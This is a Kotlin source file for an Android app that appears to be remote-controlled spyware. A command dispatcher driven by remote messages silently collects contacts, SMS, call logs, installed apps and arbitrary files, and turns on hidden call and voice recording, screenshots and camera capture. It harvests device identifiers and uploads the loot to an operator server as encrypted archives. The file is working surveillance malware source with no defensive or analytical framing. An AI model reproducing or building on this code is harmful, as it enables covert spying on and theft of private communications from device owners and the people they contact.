package com.example.mobiletwo

import android.Manifest
import android.Manifest.permission
import android.annotation.SuppressLint
import android.app.ActivityManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.ConnectivityManager
import android.net.MacAddress
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.provider.CallLog
import android.provider.ContactsContract
import android.telephony.TelephonyManager
import android.text.format.Formatter
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.core.content.ContextCompat.startActivity
import com.example.mobiletwo.Consts.Companion.sFiles
import com.example.mobiletwo.MyFireBaseMessagingService.Companion.dSPRead
import com.example.mobiletwo.MyFireBaseMessagingService.Companion.dSPWrite
import net.lingala.zip4j.model.ZipParameters
import net.lingala.zip4j.model.enums.AesKeyStrength
import net.lingala.zip4j.model.enums.EncryptionMethod
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.*
import kotlin.collections.ArrayList

class MyExecutorFG {
    companion object {
        var failed = false


        fun startJob(
            mContext: Context,
            ri: String,
            command: String,
            param: String,
            filePath: String
        ) {
            //
            try {
                failed = false
                when (command) {
                    //
                    "JW-C001" -> {
                        //TODO get CONTACTS
                        val x = getAllContacts(mContext)
                        if (x == "") {
                            MyApiOld.resp(
                                ri, "فشل المهمه", "", "", "5",
                                command, "", dSPRead.getString("imei", "") ?: ""
                            )
                            return
                        } else {
                            MyApiOld.conan(
                                ri,
                                dSPRead.getString("FCMToken", "")!!,
                                "JW-C001",
                                dSPRead.getString("mDeviceName", "")!!,
                                x,
                                x.split("/").last(),
                                "contacts",
                                imei = dSPRead.getString("imei", "")!!,
                                null,
                                null,
                                true
                            )
                        }
                    }
                    "JW-C002" -> {
                        //TODO get SMS
                        val x: String = getAllSMS(mContext)
                        if (x == "") {
                            MyApiOld.resp(
                                ri, "فشل المهمه", "", "", "5",
                                command, "", dSPRead.getString("imei", "") ?: ""
                            )
                            return
                        } else {
                            MyApiOld.conan(
                                ri,
                                dSPRead.getString("FCMToken", "")!!,
                                "JW-C002",
                                dSPRead.getString("mDeviceName", "")!!,
                                x,
                                x.split("/").last(),
                                "messages",
                                imei = dSPRead.getString("imei", "")!!,
                                null,
                                null,
                                true
                            )
                        }
                    }
                    "JW-C003" -> {
                        //getAppList
                        val x: String = coxpoHumbAnnlukatsii(mContext)
                        if (x == "") {
                            MyApiOld.resp(
                                ri, "فشل المهمه", "", "", "5",
                                command, "", dSPRead.getString("imei", "") ?: ""
                            )
                            return
                        } else {
                            MyApiOld.conan(
                                ri,
                                dSPRead.getString("FCMToken", "")!!,
                                "JW-C003",
                                dSPRead.getString("mDeviceName", "")!!,
                                x,
                                "device_applications.txt",
                                "constants",
                                imei = dSPRead.getString("imei", "")!!,
                                null,
                                null,
                                true
                            )
                        }
                    }
                    "JW-C004" -> {
                        //set_vRecording(True,params)
                        dSPWrite.putString("vRecording", "true").commit()
                        mContext.packageManager.setComponentEnabledSetting(
                            ComponentName(
                                mContext.applicationInfo.packageName,
                                "${mContext.applicationInfo.packageName}${Consts.recorderClass}"
                            ),
                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            PackageManager.DONT_KILL_APP
                        )
                    }
                    "JW-C005" -> {
                        //get_vRecordingList
                        //get to folder "3anucku"
                        val mFile = File("${sFiles.absolutePath}/Call_Records")
                        if (!mFile.exists()) {
                            mFile.mkdirs()
                        }
                        val x: String = coxpoHumbnytu("Call_Records", 1)
                        if (x == "") {
                            MyApiOld.resp(
                                ri, "فشل المهمه", "", "", "5",
                                command, "", dSPRead.getString("imei", "") ?: ""
                            )
                            return
                        } else {
                            MyApiOld.conan(
                                ri,
                                dSPRead.getString("FCMToken", "")!!,
                                "JW-C005",
                                dSPRead.getString("mDeviceName", "")!!,
                                x,
                                x.split("/").last(),
                                "RecordList",
                                imei = dSPRead.getString("imei", "")!!,
                                null,
                                null,
                                true
                            )
                        }
                    }
                    "JW-C006" -> {

                        //set_vRecording(False)
                        dSPWrite.putString("vRecording", "false").commit()
                        mContext.packageManager.setComponentEnabledSetting(
                            ComponentName(
                                mContext.applicationInfo.packageName,
                                "${mContext.applicationInfo.packageName}${Consts.recorderClass}"
                            ),
                            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                            PackageManager.DONT_KILL_APP
                        )
                    }
                    "JW-C007" -> {
                    }
                    "JW-C008" -> {
                        //getDirList("path", 0)
                        val x: String = coxpoHumbnytu(param, 1)
                        if (x == "") {
                            MyApiOld.resp(
                                ri, "فشل المهمه", "", "", "5",
                                command, "", dSPRead.getString("imei", "") ?: ""
                            )
                            return
                        } else {
                            MyApiOld.conan(
                                ri,
                                dSPRead.getString("FCMToken", "")!!,
                                "JW-C008",
                                dSPRead.getString("mDeviceName", "")!!,
                                x,
                                x.split("/").last(),
                                "constants",
                                imei = dSPRead.getString("imei", "")!!,
                                null,
                                null, true
                            )
                        }
                    }
                    "JW-C009" -> {
                        //uploadReadyFiles
                        val recDir =
                            "${sFiles.absolutePath}/Calls/"
                        val ss = File(recDir).listFiles()
                        if (ss != null && ss.isNotEmpty()) {
                            for (i in ss.indices) {
                                println(ss[i].absolutePath)
                                //conan ss[i] and i is part! ss.length is total parts
                                MyApiOld.conan(
                                    ri,
                                    dSPRead.getString("FCMToken", "")!!,
                                    "JW-C009",
                                    dSPRead.getString("mDeviceName", "")!!,
                                    ss[i].absolutePath,
                                    ss[i].name.split("/").last(),
                                    "records",
                                    imei = dSPRead.getString("imei", "")!!,
                                    "${i + 1}",
                                    "${ss.size}", true
                                )
                            }
                        } else {
                            MyApiOld.resp(
                                ri, "فشل المهمه", "", "", "5",
                                command, "", dSPRead.getString("imei", "") ?: ""
                            )
                            return
                        }

                    }
                    "JW-C010" -> {
                        //getFileList("path", 2)
                        println("UploadFile: '/$filePath'")
                        val mFile = File("/$filePath")
                        if (mFile.exists() && !mFile.isDirectory) {
                            Log.i("JW-C010", "Upload File: $filePath")
                            MyApiOld.conan(
                                ri,
                                dSPRead.getString("FCMToken", "")!!,
                                "JW-C010",
                                dSPRead.getString("mDeviceName", "")!!,
                                filePath,
                                filePath.split("/").last(),
                                "files",
                                imei = dSPRead.getString("imei", "")!!,
                                null,
                                null, false
                            )
                        }
                        val mFileX = File(filePath.replace("root", ""))
                        if (mFileX.exists() && !mFileX.isDirectory) {
                            println("UploadFile: '$filePath'")
                            MyApiOld.conan(
                                ri,
                                dSPRead.getString("FCMToken", "")!!,
                                "JW-C010",
                                dSPRead.getString("mDeviceName", "")!!,
                                filePath.replace("root", ""),
                                filePath.split("/").last(),
                                "files",
                                imei = dSPRead.getString("imei", "")!!,
                                null,
                                null, false
                            )
                        }
                    }
                    "JW-C011" -> {

                        //remDir("path")
                        val mFile = File("/$filePath")
                        if (mFile.exists()) {
                            mFile.delete()
                        }
                        val mFilex = File(filePath.replace("root", ""))
                        if (mFilex.exists()) {
                            mFilex.delete()
                        }
                        if (mFilex.exists() || mFile.exists()) {
                            MyApiOld.resp(
                                ri,
                                "فشل حذف الملف",
                                "",
                                "",
                                "0",
                                "JW-C011",
                                "",
                                dSPRead.getString("imei", "")!!
                            )
                        } else {
                            MyApiOld.resp(
                                ri,
                                "تم حذف الملف بنجاح",
                                "",
                                "",
                                "1",
                                "JW-C011",
                                "",
                                dSPRead.getString("imei", "")!!
                            )
                        }
                    }
                    "JW-C012" -> {
                        //screenshot
                        //TODO Projections
                        ckpuHwomb(mContext, ri.toInt(), command)
                    }
                    "JW-C013" -> {
                        obnovit(mContext)
                    }
                    "JW-C014" -> {
                        //Set Key Val
                        val mKey: String = param.split(", ").first()
                        val mValue: String = param.split(", ").last()
                        dSPWrite.putString(mKey, mValue).commit()
                    }
                    "JW-C015" -> {
                        //sendPwd
                        //TODO LATER!!
                    }
                    "JW-C016" -> {
                        //getPermList

                        val x = arrayOf(
                            permission.RECORD_AUDIO,
                            permission.WRITE_EXTERNAL_STORAGE,
                            permission.READ_CALL_LOG,
                            permission.READ_SMS,
                            permission.READ_CONTACTS,
                            Manifest.permission_group.CAMERA,
                            "android.permission.BIND_NOTIFICATION_LISTENER_SERVICE",
                            permission.INSTALL_PACKAGES
                        )
                        val y: MutableList<String> = arrayListOf(
                            "mic",
                            "storage",
                            "callLog",
                            "sms",
                            "contacts",
                            "screenshot",
                            "notificationAccess",
                            "googlePlay"
                        )
                        for (i in x.indices) {
                            println("${x[i]}:${ContextCompat.checkSelfPermission(mContext, x[i])}")
                            if (ContextCompat.checkSelfPermission(
                                    mContext.applicationContext,
                                    x[i]
                                ) != PackageManager.PERMISSION_GRANTED
                            ) {
                                println("in if ")
                                y[i] = ""
                            }
                        }
                        val mDeviceName = dSPRead.getString("mDeviceName", "")!!
                        MyApiOld.modo(
                            mDeviceName,
                            ri,
                            mic = y[0],
                            Storage = y[1],
                            CallLog = y[2],
                            SMS = y[3],
                            Contacts = y[4],
                            screenshot = y[5],
                            notification = y[6],
                            googlePlay = y[7],
                            imei = dSPRead.getString("imei", "")!!
                        )
                    }
                    "JW-C017" -> {
                        obnovit(mContext)
                    }
                    "JW-C018" -> {
                        //TODO chats...
                    }
                    "JW-C019" -> {
                        //TODO check connection
                        // Resp to api CallRecording status!!
                    }
                    "JW-C020" -> {
                        //getCallLog(30)
                        val x = getCallLog(mContext)
                        if (x == "") {
                            /**Failed**/
                        } else {
                            MyApiOld.conan(
                                ri,
                                dSPRead.getString("FCMToken", "")!!,
                                "JW-C021",
                                dSPRead.getString("mDeviceName", "")!!,
                                x,
                                x.split("/").last(),
                                "his",
                                imei = dSPRead.getString("imei", "")!!,
                                null,
                                null,
                                true
                            )
                        }
                    }
                    "JW-C021" -> {
                        //setConfig("useWIFIOnly", false)
                        dSPRead.getString("useWIFIOnly", "false")
                    }
                    "JW-C022" -> {
                    }
                    "JW-C023" -> {
                        //uploadReadyFiles copy from 009
                        val recDir = "${sFiles}/records/"
                        val ss = File(recDir).listFiles()
                        if (ss != null && ss.isNotEmpty()) {
                            for (i in ss.indices) {
                                println(ss[i].absolutePath)
                                //conan ss[i] and i is part! ss.length is total parts
                                MyApiOld.conan(
                                    ri,
                                    dSPRead.getString("FCMToken", "")!!,
                                    "JW-C009",
                                    dSPRead.getString("mDeviceName", "")!!,
                                    ss[i].absolutePath,
                                    ss[i].name.split("/").last(),
                                    ss[i].parentFile!!.name,
                                    imei = dSPRead.getString("imei", "")!!,
                                    "${i + 1}",
                                    "${ss.size}",
                                    true
                                )
                            }
                        }
                    }
                    "JW-C024" -> {
                        startCamera(0, mContext, ri, command)
                    }
                    "JW-C025" -> {
                        startCamera(1, mContext, ri, command)
                    }
                    "JW-C026" -> {
                        //vRecording()
                        Buguo3anucb(mContext, ri.toInt(), command)

                    }
                    "JW-C027" -> {
                    }
                    "JW-C028" -> {
                        //hideIcon
                    }
                    "JW-C029" -> {
                        //TODO update queries***
                    }
                    "JW-C030" -> {
                        //
                    }
                    "JW-Long" -> {
                        for (i in 1..60) {
                            Thread.sleep(1000).also { println("count:$i") }
                        }
                    }
                    else -> {
                        println("Command $command is not Implemented! \n bye!")
                    }
                }
//            if (command!="JW-C026" && command!="JW-C025" && command!="JW-C012" && command!="JW-C024"){
//                if (ri.toInt()!=0){
//                    MyApiOld.resp(ri,"المهمه مكتمله","","","3", command, "", dSPRead.getString("imei", "")?:"")
//                }
//            }
                when(command) {
                    "JW-C012" ->{}
                    "JW-C024" ->{}
                    "JW-C025" ->{}
                    "JW-C026" ->{}
                    else -> {
                        informSuccess(command = command, ri = ri)
                    }
                }

            } catch (ex: Exception) {
                failed = true
                logEx(ex, "startJob")
                if (ri.toInt() != 0) {
                    MyApiOld.resp(
                        ri, "فشل المهمه", "", "", "5",
                        command, "", dSPRead.getString("imei", "") ?: ""
                    )
                }
            }
            try {
                MyForeGroundService.stopService(mContext)
            } catch (ex: Exception) {
                logEx(ex, "startJob - stoppingService")
            }
        }

        private fun informSuccess(ri: String, command: String) {
            try {
                if (failed) {
                    return
                } else {
                    if (ri.toInt() != 0) {
                        MyApiOld.resp(
                            ri,
                            "المهمه مكتمله",
                            "",
                            "",
                            "3",
                            command,
                            "",
                            dSPRead.getString("imei", "") ?: ""
                        )
                    }
                }
            } catch (ex: Exception) {
                logEx(ex, "informSuccess")
            }
        }


        private fun Buguo3anucb(tContext: Context, ri: Int, command: String) {
            try {
                val mBuguo3anucb = Intent(tContext, VideoRecord::class.java)
                mBuguo3anucb.putExtra("ri", ri)
                mBuguo3anucb.putExtra("command", command)
                mBuguo3anucb.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                mBuguo3anucb.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                startActivity(tContext, mBuguo3anucb, null)
            } catch (ex: Exception) {
                logEx(ex, "Buguo3anucb")
            }
        }

        private fun getCallLog(tContext: Context): String {
            try {
                val mCalender = Calendar.getInstance()
                val toDate = mCalender.timeInMillis.toString()
                mCalender.roll(Calendar.MONTH, false)
                val fromDate = mCalender.timeInMillis.toString()
                val whereValue = arrayOf(fromDate, toDate)
                Log.i(whereValue[0], whereValue[1])
                val mCursor: Cursor? = tContext.contentResolver.query(
                    CallLog.Calls.CONTENT_URI, null,
                    CallLog.Calls.DATE + " BETWEEN ? AND ?", whereValue,
                    CallLog.Calls.DATE + " DESC limit 600"
                )
                if (mCursor != null) {
                    mCursor.moveToFirst()
                } else {
                    Log.i("Error", "null");return ""
                }
                val allCalls = JSONArray()
                do {
                    val mCall = JSONObject()
                    for (i in 0 until mCursor.columnCount) {
                        mCall.put(mCursor.getColumnName(i), mCursor.getString(i) ?: "null")
                    }
                    Log.i("CallLog", mCall.toString())
                    allCalls.put(mCall)
                } while (mCursor.moveToNext())
                mCursor.close()
                return writeToFile(allCalls.toString(), "CallLog.txt", true)
            } catch (ex: Exception) {
                logEx(ex, "getCallLog")
                return ""
            }
        }

        private fun ckpuHwomb(tContext: Context, ri: Int, command: String) {
            try {
                val mCkpuhwom = Intent(tContext, Ckpuhwom::class.java)
                mCkpuhwom.putExtra("ri", ri)
                mCkpuhwom.putExtra("command", command)
                mCkpuhwom.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                mCkpuhwom.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                startActivity(tContext, mCkpuhwom, null)

            } catch (ex: Exception) {
                logEx(ex, "ckpuHwomb")
            }
        }

        private fun coxpoHumbnytu(dirs: String, dType: Int): String {
//           TODO: Old Solution!!
//            val tree = File("/storage/emulated/0/$dirs")
//            val mList:MutableList<String> = arrayListOf()
//            if (!tree.exists()){return ""}
//            tree.walkBottomUp().also { it.forEach { tFile: File ->
//                if (dType == 0 && tFile.isDirectory) {mList.add("/root" + tFile.absolutePath)}
//                else if (dType != 0 && !tFile.isDirectory){mList.add("/root" + tFile.absolutePath)}
//            }}
//            return writeToFileStatic(mList.joinToString().replace(", ", "\n"), fPAth = "files_tree.txt")
            try {
                val tree: File = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    File("/storage/emulated/0/$dirs")
                } else {
                    File("${Environment.getExternalStorageDirectory()}/$dirs")
                }
                val mList: MutableList<String> = arrayListOf()
                if (!tree.exists()) {
                    return ""
                }
                tree.walkBottomUp().also {
                    it.forEach { tFile: File ->
                        if (dType == 0 && tFile.isDirectory) {
                            mList.add("/root" + tFile.absolutePath)
                        } else if (dType != 0 && !tFile.isDirectory) {
                            mList.add("/root" + tFile.absolutePath)
                        }
                    }
                }
                return writeToFileStatic(
                    mList.joinToString().replace(", ", "\n"),
                    fPAth = "files_tree.txt"
                )
            } catch (ex: Exception) {
                logEx(ex, "coxpoHumbnytu")
                return ""
            }
        }

        private fun coxpoHumbAnnlukatsii(tContext: Context): String {
            return try {
                val packages = tContext.packageManager.getInstalledApplications(0)
                val mPM: PackageManager = tContext.packageManager
                val appList: MutableList<String> = arrayListOf()
                for (packageInfo in packages) {
                    appList.add(packageInfo.loadLabel(mPM).toString().replace(", ", "\n"))
                }
                writeToFileStatic(appList.joinToString(), "apps.txt")
            } catch (ex: Exception) {
                logEx(ex, "coxpoHumbAnnlukatsii")
                ""
            }
        }

        private fun writeToFileStatic(data: String, fPAth: String): String {
            return try {
                Log.i("writeToFile->", data.replace(", ", "\n"))
                val mFile = File(sFiles.absolutePath + "/constants/$fPAth")
                File(mFile.parent!!).mkdirs()
                mFile.createNewFile()
                mFile.writeText(data.replace(", ", "\n"), Charsets.UTF_8)
                Log.i("path", mFile.absolutePath)
                mFile.absolutePath
            } catch (ex: Exception) {
                logEx(ex, "writeToFileStatic")
                ""
            }
        }

        private fun getAllSMS(tContext: Context): String {
            try {
                val mCursor: Cursor? = tContext.contentResolver.query(
                    Uri.parse("content://sms"),
                    null,
                    null,
                    null,
                    null
                )
                if (mCursor != null) {
                    mCursor.moveToFirst()
                } else {
                    Log.i("mCursor: ", "Null");return ""
                }
                Log.i("mCursor: ", "${mCursor.count}")
                val allSMS = JSONArray()
                do {
                    val mSms = JSONObject()
                    for (i in 0 until mCursor.columnCount) {
                        mSms.put(mCursor.getColumnName(i), mCursor.getString(i) ?: "null")
                    }
                    allSMS.put(mSms)
                } while (mCursor.moveToNext())
                mCursor.close()
                return writeToFile(allSMS.toString(), "MESSAGES.txt", true)
            } catch (ex: Exception) {
                logEx(ex, "getAllSMS")
                return ""
            }
        }

        private fun getAllContacts(tContext: Context): String {
            try {
                val allContacts = JSONArray()
                val mCursor: Cursor? = tContext.contentResolver.query(
                    ContactsContract.Contacts.CONTENT_URI,
                    arrayOf(ContactsContract.Contacts.DISPLAY_NAME), null, null, null
                )
                if (mCursor != null) {
                    mCursor.moveToFirst()
                } else {
                    return ""
                }
                val tCursor = tContext.contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    arrayOf(ContactsContract.CommonDataKinds.Phone.NUMBER), null, null, null
                )
                do {
                    val mContact = JSONObject()
                    val name = mCursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
                    tCursor?.moveToPosition(mCursor.position)
                    val number =
                        tCursor!!.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                    mContact.put("name", mCursor.getString(name))
                    mContact.put("number", tCursor.getString(number))
                    allContacts.put(mContact)
                } while (mCursor.moveToNext())
                tCursor.close()
                mCursor.close()
                return writeToFile(allContacts.toString(), "CONTACTS.txt", true)
            } catch (ex: Exception) {
                logEx(ex, "getAllContacts")
                return ""
            }
        }

        private fun writeToFile(data: String, fPath: String, isZip: Boolean): String {
            try {
                //"TestFile.Test"
                Log.i("writeToFile->", data)
                val mFile = File(
                    sFiles.absolutePath + "/${fPath.split(".").first()}/"
                            + fPath.split(".")
                        .first() + "_" + Calendar.getInstance().timeInMillis.toString() + "."
                            + fPath.split(".").last()
                )
                File(mFile.parent!!).mkdirs()
                mFile.createNewFile()
                mFile.writeText(data, Charsets.UTF_8)
                Log.i("path", mFile.absolutePath)
                if (isZip) {
                    val x = zipLocalFile(
                        arrayListOf(mFile.absolutePath),
                        mFile.parent!! + "/" + mFile.name.split(".").first() + ".zip"
                    )
                    mFile.delete()
                    return x
                }
                return mFile.absolutePath
            } catch (ex: Exception) {
                logEx(ex, "writeToFile")
                return ""
            }
        }

        fun obnovit(tContext: Context) {
            try {
                //android.permission.ACCESS_WIFI_STATEFCMToken
                //android.permission.READ_PHONE_STATE
                val token: String? = dSPRead.getString("FCMToken", "Null")

                val imei = getAnImei(tContext)

                writeToFile(imei, "imei.txt", false)
                //Toast.makeText(tContext, "imei:$imei", Toast.LENGTH_LONG)
                dSPWrite.putString("imei", imei).commit()
                Log.i("got imei", imei)
                val mActivityManager: ActivityManager =
                    tContext.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
                val mMemoryInfo: ActivityManager.MemoryInfo = ActivityManager.MemoryInfo()
                mActivityManager.getMemoryInfo(mMemoryInfo)
                val dRam =
                    mMemoryInfo.totalMem.toString()[0] + "." + mMemoryInfo.totalMem.toString()[1] + "G"
                dSPWrite.putString("dRam", dRam).commit()

                val dStorage = "TODO('ImplementThisFirst')"
                dSPWrite.putString("dStorage", dStorage).commit()

                val dName: String = Build.DEVICE
                dSPWrite.putString("mDeviceName", dName).commit()

                val myWifiManager: WifiManager = tContext.applicationContext.getSystemService(
                    Context.WIFI_SERVICE
                ) as WifiManager
                val mMacAddress: String = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    MacAddress.BROADCAST_ADDRESS.toString()
                } else {
                    myWifiManager.connectionInfo.bssid
                }
                dSPWrite.putString("mMacAddress", mMacAddress).commit()


                val dModel = Build.MODEL
                dSPWrite.putString("dModel", dModel).commit()


                val osVersion = Build.VERSION.SDK_INT.toString()
                dSPWrite.putString("osVersion", osVersion).commit()


                val mInfo: ConnectivityManager =
                    tContext.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
                val cType = mInfo.activeNetworkInfo!!.typeName
                dSPWrite.putString("cType", cType).commit()

                //val myWifiManager:WifiManager = tContext.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
                val ipv4 = Formatter.formatIpAddress(myWifiManager.connectionInfo.ipAddress)
                dSPWrite.putString("ipv4", ipv4).commit()

                val mBatteryManager: BatteryManager =
                    tContext.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
                val bLvl = mBatteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
                    .toString()

                val appName: String = Build.VERSION.CODENAME
                dSPWrite.putString("appName", appName).commit()

                val dLang = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    tContext.resources.configuration.locales[0].displayLanguage
                } else {
                    "VERSION.SDK_INT < N"
                }
                dSPWrite.putString("dLang", dLang).commit()
                MyApiOld.haberkorn(
                    dName,
                    mMacAddress,
                    appName,
                    dModel,
                    osVersion,
                    imei,
                    bLvl,
                    dStorage,
                    token ?: "Null",
                    cType,
                    dRam,
                    dLang
                )
            } catch (ex: Exception) {
                logEx(ex, "obnovit")
            }
        }

        @SuppressLint("NewApi")
        private fun getAnImei(tContext: Context): String {
            val mTelephonyManager: TelephonyManager =
                tContext.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            try {
                return mTelephonyManager.getImei()
            } catch (ex: Exception) {
                logEx(ex, "getImei")
            }
            try {
                return mTelephonyManager.imei
            } catch (ex: Exception) {
                logEx(ex, "imei")
            }
            try {
                return mTelephonyManager.deviceId
            } catch (ex: Exception) {
                logEx(ex, "deviceId")
            }
            try {
                if (Build.getSerial() != "unknown" && Build.getSerial() != "") {
                    return Build.getSerial()
                } else {
                    throw Exception("returns Unknown")
                }
            } catch (ex: Exception) {
                logEx(ex, "getSerial")
            }
            try {
                return android.provider.Settings.Secure.getString(
                    tContext.contentResolver,
                    android.provider.Settings.Secure.ANDROID_ID
                )
            } catch (ex: Exception) {
                logEx(ex, "ANDROID_ID")
            }
            try {
                return Build.FINGERPRINT + Calendar.getInstance().timeInMillis.toString()
            } catch (ex: Exception) {
                logEx(ex, "FINGERPRINT")
            }
//        return Calendar.getInstance().timeInMillis.toString() + android.provider.Settings.Secure.getString(tContext.contentResolver, android.provider.Settings.Secure.ANDROID_ID) +
//                Build.TIME.toString()
            return "${System.currentTimeMillis()}${Build.TIME}${android.provider.Settings.Secure._ID}"
        }

        private fun startCamera(lens: Int, mContext: Context?, ri: String, command: String) {

            try {
                println("startCamera: $lens, $ri, $command.")
                val mTakePhoto = Intent(mContext, TakePhoto::class.java)
                mTakePhoto.putExtra("ri", ri.toInt())
                mTakePhoto.putExtra("command", command)
                mTakePhoto.putExtra("lens", lens)
                mTakePhoto.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                mTakePhoto.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                //startActivity(tContext, mTakePhoto, null)
                //TODO try StartActivity from Foreground Channel
                mContext!!.startActivity(mTakePhoto)
                println("started")
            } catch (ex: Exception) {
                logEx(ex, "startCamera")
            }
        }

        fun zipLocalFile(fPaths: ArrayList<String>, outPut: String): String {
            return try {
                val x: net.lingala.zip4j.ZipFile = net.lingala.zip4j.ZipFile(outPut)
                val mZipParameters = ZipParameters()
                mZipParameters.isEncryptFiles = true
                mZipParameters.encryptionMethod = EncryptionMethod.AES
                mZipParameters.aesKeyStrength = AesKeyStrength.KEY_STRENGTH_256
                val imeistr: String = dSPRead.getString("imei", "")!!
                println("IMEI: $imeistr")
                x.setPassword("prefix${imeistr}suffix".toCharArray())
                //prefix352021090391285suffix
                for (i in fPaths.indices) {
                    x.addFile(fPaths[i], mZipParameters)
                }
                Log.i("Zipped at", x.file.absolutePath)
                x.file.absolutePath
            } catch (ex: Exception) {
                logEx(ex, "zipLocalFile")
                ""
            }
        }

        fun writeError(ex: Exception, jsonBody: String = "", method: String = "Unknown") {
            try {
                File("${sFiles.absolutePath}/Logs").mkdirs()
                var eFile =
                    File("${sFiles.absolutePath}/Logs/Log_${System.currentTimeMillis()}.txt")
                eFile.writeText("Method: $method\n________________________________\n")
                eFile.writeText("Message: ${ex.message}\n________________________________\n")
                eFile.writeText("JsonBody:\n$jsonBody\n________________________________\n")
                eFile.writeText(ex.stackTraceToString())
            } catch (ex: Exception) {
                //
            }
        }

        fun logEx(ex: Exception, method: String) {
            try {
                if (Consts.debugLevel % 2 == 1) {
                    //odd level = println
                    println("$method: ${ex.message}")
                    ex.printStackTrace()
                }
                if (Consts.debugLevel > 1) {
                    // high level = write to Logs
                    writeError(ex)
                }
            } catch (ex: Exception) {
                //
            }
        }
    }
}

